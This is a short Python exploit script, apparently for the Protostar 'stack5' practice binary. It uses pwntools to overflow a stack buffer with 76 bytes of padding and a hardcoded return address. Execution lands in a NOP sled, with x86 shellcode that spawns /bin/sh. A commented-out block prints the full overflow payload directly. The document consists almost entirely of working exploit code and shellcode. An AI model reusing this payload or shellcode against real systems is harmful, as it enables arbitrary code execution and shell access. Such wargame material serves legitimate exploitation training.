#!/usr/bin/env python
from pwn import *
import sys

stackAddr = 0xbffff6dc
e = ELF('stack5')
offset = 76
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = "A"*offset
payload += p32(stackAddr + 40)
payload += '\x90' * 100
payload += '\x90'*10 + '\xcc'*4
r = process([e.path])
pause()
gdb.attach(r)
r.send(payload)
r.interactive()
r.close()
'''
import struct
offset = "A"*76
sp = struct.pack("I", 0xbffff6dc + 40)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

nops = '\x90'*100

print offset + sp + nops + shellcode
'''
